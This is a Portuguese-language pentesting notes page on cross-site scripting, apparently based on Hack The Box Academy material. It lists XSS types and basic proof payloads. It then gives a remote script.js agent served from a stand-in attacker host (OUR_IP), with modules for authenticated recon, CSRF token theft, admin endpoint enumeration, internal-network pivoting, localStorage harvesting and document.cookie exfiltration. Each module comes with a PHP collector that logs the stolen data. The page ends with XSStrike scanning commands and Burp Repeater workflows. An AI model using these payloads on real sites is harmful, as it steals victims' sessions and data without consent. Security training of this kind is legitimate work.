---
title: Cross-Site Scripting
---

### 1. Tipos de XSS
{{< tabs items="Reflected XSS, Stored XSS, DOM-based XSS, Self-XSS" >}}
{{< tab >}}

#### **Reflected XSS**
Ocorre quando o dado enviado pelo usuário é devolvido imediatamente na resposta HTTP, inserido no HTML sem escaping. Qualquer interpretação direta pelo navegador resulta na execução do payload.
{{< /tab >}}
{{< tab >}}

#### **Stored XSS**
O payload é **persistido** no servidor (banco, arquivo, cache, comentário, perfil). Quando uma página carrega esse conteúdo, o navegador executa o JavaScript integrado.
{{< /tab >}}
{{< tab >}}

#### **DOM-based XSS**
O front-end manipula valores controlados pelo usuário e os insere no DOM sem validação. A vulnerabilidade está no JavaScript do cliente, não no servidor.
{{< /tab >}}
{{< tab >}}

#### **Self-XSS**
Requer que a própria vítima digite ou cole o código no navegador. Não é explorável remotamente.
{{< /tab >}}
{{< /tabs >}}

---
### 2. Técnicas de exploração XSS
#### **Técnica 1 — Execução Direta via `<script>`**

**Conceito:**
Usada como verificação inicial para confirmar se o navegador executa JavaScript injetado e identificar o contexto de execução (`window.origin`).

**Requisitos:**
* Reflexão direta no HTML (Reflected/Stored XSS)
* Contexto **HTML** não filtrado
* `<script>` não bloqueado por WAF ou sanitização

**Exemplo:**
```html
<script>alert(window.origin)</script>
```

---
#### **Técnica 2 — Quebra Estrutural via `<plaintext>`**

**Conceito:**
Transforma todo o restante do documento em texto puro, revelando ausência de escaping ou sanitização.

**Requisitos:**
* Reflexão direta em contexto HTML
* Navegador aceitando `<plaintext>` como delimitador
* Nenhum filtro removendo tags desconhecidas

**Exemplo:**
```html
<plaintext>
```

---
#### **Técnica 3 — Execução Alternativa via `print()`**

**Conceito:**
Quando `alert()` é bloqueado, `print()` confirma execução de JavaScript de forma silenciosa.

**Requisitos:**
* `<script>` permitido
* Função `print()` disponível no ambiente do navegador

**Exemplo:**
```html
<script>print()</script>
```

---
#### **Técnica 4 — Execução via Evento HTML (`onerror`)**

**Conceito:**
Abusa de eventos HTML para executar código quando `<script>` é filtrado.

**Requisitos:**
* Injeção em contexto HTML
* Elementos com atributos de evento permitidos
* `onerror` não sanitizado

**Exemplo:**
```html
<img src="" onerror=alert(window.origin)>
```

---
#### **Técnica 5 — Manipulação Direta do DOM (CSS)**

**Conceito:**
Demonstra controle programático do DOM alterando o estilo da interface.

**Requisitos:**
* Execução de JavaScript permitida
* Acesso à árvore do DOM

**Exemplo:**
```html
<script>document.body.style.background = "#141d2b"</script>
```

---
#### **Técnica 6 — Injeção de Imagem de Fundo**

**Conceito:**
Altera a imagem de fundo do `body` carregando um recurso externo, demonstrando controle visual completo da página e capacidade de forçar o carregamento de conteúdo remoto (útil para defacement, engenharia social e validação de impacto além de `alert()`).

**Requisitos:**
* Execução de JavaScript ativa
* `document.body` acessível

**Exemplo:**
```html
<script>document.body.background = "https://www.hackthebox.eu/images/logo-htb.svg"</script>
```

---
#### **Técnica 7 — Manipulação de Metadados (Título)**

**Conceito:**
Controla o título da página, útil para engenharia social.

**Requisitos:**
* Execução de JavaScript
* Acesso ao `document.title`

**Exemplo:**
```html
<script>document.title = 'HackTheBox Academy'</script>
```

---
#### **Técnica 8 — Sobrescrita Completa do Documento**

**Conceito:**
Mostra controle absoluto sobre o DOM ao substituir totalmente o conteúdo visível.

**Requisitos:**
* Execução de JavaScript
* Permissão de alterar `innerHTML`

**Exemplo:**
```html
<script>document.getElementsByTagName('body')[0].innerHTML = 'text'</script>
```

---
#### **Técnica 9 — Remoção Cirúrgica de Elementos**

**Conceito:**
Remove elementos específicos, demonstrando controle seletivo do DOM.

**Requisitos:**
* Execução de JavaScript
* IDs acessíveis no DOM

**Exemplo:**
```html
<script>document.getElementById('urlform').remove();</script>
```

---
#### **Técnica 10 — Payload Remoto de Agente (`script.js`)**

**Conceito:**
Carrega um **agente externo** capaz de executar ações autenticadas, realizar recon, extrair informações e enviar telemetria.

**Requisitos:**
* Execução de JavaScript
* O navegador deve conseguir carregar scripts externos
* Conectividade com o servidor do agente (`OUR_IP`)
* SameSite do cookie permitindo request a partir da página carregada

**Injeção:**
```html
<script src="http://OUR_IP/script.js"></script>
```

---
#### **Módulo A — Recon Autenticado de Superfície**

**Conceito:**
Enumera rotas internas acessíveis ao usuário e revela permissões efetivas.

**Requisitos:**
* Cookies válidos
* Endpoints acessíveis via `fetch()`

**script.js**
```javascript
(async () => {
  const targets = ["/", "/home.php", "/profile", "/settings", "/admin", "/api/users/me"];
  const summary = [];
  for (const path of targets) {
    try {
      const response = await fetch(path, { credentials: "include" });
      summary.push(`${path}:${response.status}`);
    } catch {
      summary.push(`${path}:ERR`);
    }
  }
  new Image().src =
    "http://OUR_IP/index.php?recon=" + encodeURIComponent(summary.join(","));
})();
```

**index.php**
```php
<?php
// Coletor A — Recon autenticado
$linha = date('c') . ' ' . ($_GET['recon'] ?? '') . PHP_EOL;
file_put_contents('recon.txt', $linha, FILE_APPEND);
```

**Funcionamento:**
O JavaScript percorre uma lista de rotas, faz requisições autenticadas com `credentials: "include"` e monta pares `rota:status`. Em seguida, envia esse resumo para `index.php` via uma requisição de imagem. O PHP recebe o parâmetro `recon` e registra cada linha, com timestamp, em `recon.txt`.

---
#### **Módulo B — Extração de Estruturas HTML**

**Conceito:**
Obtém valores expostos no DOM (por exemplo, tokens em campos ocultos), úteis para entender fluxos protegidos por parâmetros internos.

**Requisitos:**
* Página acessível com sessão válida
* Suporte a `DOMParser` no navegador

**script.js**
```javascript
(async () => {
  const response = await fetch("/home.php", {
    method: "GET",
    credentials: "include"
  });
  const html = await response.text();
  const doc = new DOMParser().parseFromString(html, "text/html");
  const token =
    doc.querySelector("input[name='csrf_token']")?.value ||
    doc.querySelector("#csrf_token")?.value ||
    "NOT_FOUND";
  new Image().src =
    "http://OUR_IP/index.php?token" + encodeURIComponent(token);
})();
```

**index.php**
```php
<?php
// Coletor B — Valores extraídos do HTML
$linha = date('c') . ' ' . ($_GET['token'] ?? '') . PHP_EOL;
file_put_contents('tokens.txt', $linha, FILE_APPEND);
```

**Funcionamento:**
O JavaScript busca `/home.php`, faz o parse do HTML, extrai o valor de um campo de token e envia esse valor em `token` para o coletor. O PHP registra cada token recebido, com timestamp, em `tokens.txt`.

---
#### **Módulo C — Enumeração de Endpoints Privilegiados**

**Conceito:**
Verifica quais rotas administrativas existem e como respondem para o usuário atual, evidenciando permissões implícitas.

**Requisitos:**
* Sessão autenticada
* Endpoints administrativos acessíveis ao menos para verificação (não necessariamente autorizados)

**script.js**
```javascript
(async () => {
  const endpoints = [
    "/admin/panel",
    "/admin/users",
    "/admin/logs",
    "/admin/settings",
    "/api/admin/panel"
  ];
  const output = [];
  for (const ep of endpoints) {
    try {
      const resp = await fetch(ep, {
        method: "GET",
        credentials: "include"
      });
      if (resp.status !== 404) {
        output.push(`${ep}:${resp.status}`);
      }
    } catch {
      // opcional: output.push(`${ep}:ERR`);
    }
  }
  new Image().src =
    "http://OUR_IP/index.php?priv=" + encodeURIComponent(output.join(","));
})();
```

**index.php**
```php
<?php
// Coletor C — Endpoints privilegiados
$linha = date('c') . ' ' . ($_GET['priv'] ?? '') . PHP_EOL;
file_put_contents('priv.txt', $linha, FILE_APPEND);
```

**Funcionamento:**
O JavaScript testa uma lista de rotas administrativas com a sessão da vítima e registra apenas os endpoints que não retornam 404, com seus status HTTP. O PHP recebe o parâmetro `priv` e grava o resumo em `priv.txt`.

---
#### **Módulo D — Pivot Interno (Hosts Internos)**

**Conceito:**
Usa o navegador da vítima como pivô para testar acessibilidade de hosts internos que não são expostos externamente.

**Requisitos:**
* Vítima em rede interna com acesso aos hosts alvo
* `fetch` com `mode: "no-cors"` permitido

**script.js**
```javascript
(async () => {
  const hosts = [
    "http://internal.local/",
    "http://internal.local/admin",
    "http://intranet/"
  ];
  const res = [];
  for (const h of hosts) {
    try {
      await fetch(h, {
        method: "GET",
        credentials: "include",
        mode: "no-cors"
      });
      res.push(`${h}:REQ_SENT`);
    } catch {
      res.push(`${h}:ERR`);
    }
  }
  new Image().src =
    "http://OUR_IP/index.php?pivot=" + encodeURIComponent(res.join(","));
})();
```

**index.php**
```php
<?php
// Coletor D — Pivot interno
$linha = date('c') . ' ' . ($_GET['pivot'] ?? '') . PHP_EOL;
file_put_contents('pivot.txt', $linha, FILE_APPEND);
```

**Funcionamento:**
O JavaScript tenta acessar uma lista de hosts internos usando o contexto de rede da vítima e marca cada host como `REQ_SENT` ou `ERR`. O PHP armazena esse array serializado em `pivot.txt` para posterior análise da superfície interna alcançável.

---
#### **Módulo E — Coleta de Informações do DOM**

**Conceito:**
Mapeia informações expostas no contexto do navegador (URL atual, origem, chaves de `localStorage`) que podem influenciar o comportamento da aplicação.

**Requisitos:**
* Acesso ao `window` e ao DOM
* `localStorage` disponível no contexto

**script.js**
```javascript
(() => {
  const data = {
    url: location.href,
    origin: location.origin,
    localStorageKeys: Object.keys(localStorage)
  };
  new Image().src =
    "http://OUR_IP/index.php?info=" + encodeURIComponent(JSON.stringify(data));
})();
```

**index.php**
```php
<?php
// Coletor E — Informações do DOM
$linha = date('c') . ' ' . ($_GET['info'] ?? '') . PHP_EOL;
file_put_contents('dominfo.txt', $linha, FILE_APPEND);
```

**Funcionamento:**
O JavaScript monta um objeto com informações do contexto do navegador e serializa em JSON. Esse JSON é enviado como parâmetro `info`, e o PHP grava cada linha em `dominfo.txt` para revisão posterior.

---
#### **Módulo F — Automação de Interações Autenticadas**

**Conceito:**
Executa, em lote, chamadas autenticadas para endpoints de interesse, ajudando a entender como a aplicação responde a fluxos comuns com a sessão comprometida.

**Requisitos:**
* Sessão autenticada ativa
* Endpoints válidos e acessíveis

**script.js**
```javascript
(async () => {
  const endpoints = [
    "/settings",
    "/messages",
    "/notifications"
  ];
  const result = [];
  for (const e of endpoints) {
    try {
      const r = await fetch(e, {
        method: "GET",
        credentials: "include"
      });
      result.push(`${e}:${r.status}`);
    } catch {
      result.push(`${e}:ERR`);
    }
  }
  new Image().src =
    "http://OUR_IP/index.php?auto=" + encodeURIComponent(result.join(","));
})();
```

**index.php**
```php
<?php
// Coletor F — Automação de fluxos autenticados
$linha = date('c') . ' ' . ($_GET['auto'] ?? '') . PHP_EOL;
file_put_contents('automation.txt', $linha, FILE_APPEND);
```

**Funcionamento:**
O JavaScript dispara requisições autenticadas para endpoints selecionados e registra o status de cada um. O PHP recebe o parâmetro `auto` e persiste o resumo em `automation.txt`.

---
#### **Módulo G — Exfiltração de Cookies**

**Conceito:**
Captura o conteúdo de `document.cookie` no contexto da aplicação e o envia para o coletor remoto para análise de como a aplicação gerencia sessões, flags de segurança e escopo de cookies.

**Requisitos:**
* `document.cookie` acessível (sem flag `HttpOnly`)
* Execução de JavaScript no contexto da aplicação alvo
* Conectividade com o servidor remoto

**script.js**
```javascript
(() => {
  const c = document.cookie || "NO_COOKIE";
  new Image().src =
    "http://OUR_IP/index.php?c=" + encodeURIComponent(c);
})();
```

**index.php**
```php
<?php
// Coletor G — Cookies
$linha = date('c') . ' ' . ($_GET['c'] ?? '') . PHP_EOL;
file_put_contents('cookies.txt', $linha, FILE_APPEND);
```

**Funcionamento:**
O JavaScript lê `document.cookie` e envia o valor como parâmetro `c` em uma requisição de imagem para o servidor remoto. O PHP recebe o valor e registra cada linha em `cookies.txt`, permitindo analisar posteriormente quais cookies estavam expostos ao contexto de script.

---
### 3. Automação de XSS com XSStrike

**Conceito:**
Ferramenta de linha de comando para descoberta e exploração de XSS (principalmente Reflected e DOM-based). Faz análise de contexto, gera payloads automaticamente e também suporta uso de listas de payloads externas via arquivo, permitindo automatizar fuzzing de parâmetros vulneráveis.

**Requisitos:**
* Python 3
* Acesso HTTP à aplicação alvo
* Git para clonar o repositório

**Comandos:**
```bash
# Clonar XSStrike
git clone https://github.com/s0md3v/XSStrike.git
cd XSStrike
```

```bash
# Scan básico em parâmetro GET
python3 xsstrike.py -u "http://TARGET_HOST/search.php?q=TESTE"
```

```bash
# Scan em endpoint com método POST
python3 xsstrike.py -u "http://TARGET_HOST/search.php" \
  --data "q=TESTE"
```

```bash
# Crawl + teste automático (profundidade 3)
python3 xsstrike.py -u "http://TARGET_HOST/page.php" \
  --crawl -l 3
```

```bash
# Uso de lista de payloads externa
python3 xsstrike.py -u "http://TARGET_HOST/page.php?q=TESTE" \
  -f payloads/xss_reflected_basic.txt
```

**Funcionamento:**
XSStrike envia requisições para a URL alvo, analisa o contexto em que o parâmetro é refletido e tenta injetar payloads XSS adequados. No modo padrão, usa o próprio motor interno de geração de payloads. Com a opção `-f`, lê payloads linha a linha de um arquivo e injeta cada um no parâmetro marcado (por exemplo, `TESTE`), verificando quais geram comportamento compatível com XSS.

**Links de payload list:**
* XSStrike (download / clone): `https://github.com/s0md3v/XSStrike`
* PayloadsAllTheThings — XSS Injection (lista extensa de payloads e bypasses): `https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XSS%20Injection`
* FuzzDB — XSS com contexto (inclui `JHADDIX_XSS_WITH_CONTEXT.doc.txt`): `https://github.com/fuzzdb-project/fuzzdb/blob/master/attack/xss/JHADDIX_XSS_WITH_CONTEXT.doc.txt`
* SecLists — payloads XSS em Fuzzing/XSS: `https://github.com/danielmiessler/SecLists`

---
### 4. Burp Repeater + Payload Lists

**Conceito:**
Burp Repeater é usado para ajuste fino de XSS: testar manualmente payloads específicos em parâmetros já identificados, observar a resposta renderizada e validar impacto. As listas de payloads ficam versionadas em arquivos e são aplicadas diretamente nos parâmetros controlados.

**Requisitos:**
* Burp Suite com Proxy configurado e Repeater ativo
* Requisição vulnerável capturada e enviada ao Repeater
* Arquivos de payloads XSS organizados por contexto

**Exemplo de requisição:**
```http
GET /search.php?q=XSS_TEST HTTP/1.1
Host: TARGET_HOST
User-Agent: Burp
Accept: */*
Connection: close
```

**Funcionamento:**
A requisição vulnerável é enviada para o Repeater com um placeholder (`XSS_TEST`) no parâmetro alvo. Para cada payload de uma das listas, o valor de `XSS_TEST` é substituído manualmente pelo payload e o request é reenviado. A resposta é analisada nas abas Raw/Render para verificar reflexão, escaping e execução. As diferentes listas (`xss_reflected_basic`, `xss_context_attr`, `xss_context_js_string`, `xss_blind_beacon`) são usadas conforme o contexto observado na resposta e permitem repetir sempre o mesmo conjunto de testes de forma consistente.

**Links de payload list:**
* PayloadsAllTheThings — XSS Injection: `https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XSS%20Injection`
* FuzzDB — XSS (contextual): `https://github.com/fuzzdb-project/fuzzdb/tree/master/attack/xss`
* SecLists — diretório de XSS (Fuzzing/XSS): `https://github.com/danielmiessler/SecLists`
* PortSwigger — XSS Cheat Sheet (para análise e inspiração de novos payloads): `https://portswigger.net/web-security/cross-site-scripting/cheat-sheet`
